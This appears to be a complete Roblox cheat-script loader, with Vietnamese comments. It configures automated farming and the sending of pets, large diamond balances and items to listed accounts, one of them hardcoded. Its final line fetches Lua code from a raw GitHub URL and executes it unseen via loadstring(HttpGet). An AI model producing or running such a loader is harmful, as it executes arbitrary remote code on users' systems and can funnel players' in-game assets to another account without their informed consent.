getgenv().Config = {
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' },
        HOUSE2 = { '>1000' },
        HOUSE3 = { '6000~14000', '>25000' },
        HOUSE4 = { '14000~20000' },
        HOUSE5 = { '>20000' },
        HOUSE6 = { '>26000' }, 
    },
    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7, 8, 9 }, -- slot dành cho pet
        EGG_SLOTS = { 10 }, -- slot dành cho trứng
    },
    -- Gửi PET Titanic/Huge
    SEND_PET = {
        Usernames = { '' },
        PetSendInterval = 200,
    },
    -- Gửi DIAMONDS
    SEND_DIAMONDS = {
        Usernames = { 'OKkMma_b' },
        MinDiamonds = 50000000,
    },
    -- Gửi ITEM
    SEND_ITEM = {
        Usernames = { '' },
        ['Halloween Lucky Egg'] = { amount = 10 },
        ['Golden Apple'] = { amount = 'all' },
        ['Spectral Potion'] = { amount = 3 },
    },
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/cholacoho123/fuck.lua/refs/heads/main/h%20a%20p%20p%20o%20w%20e%20e%20n.lua"))()
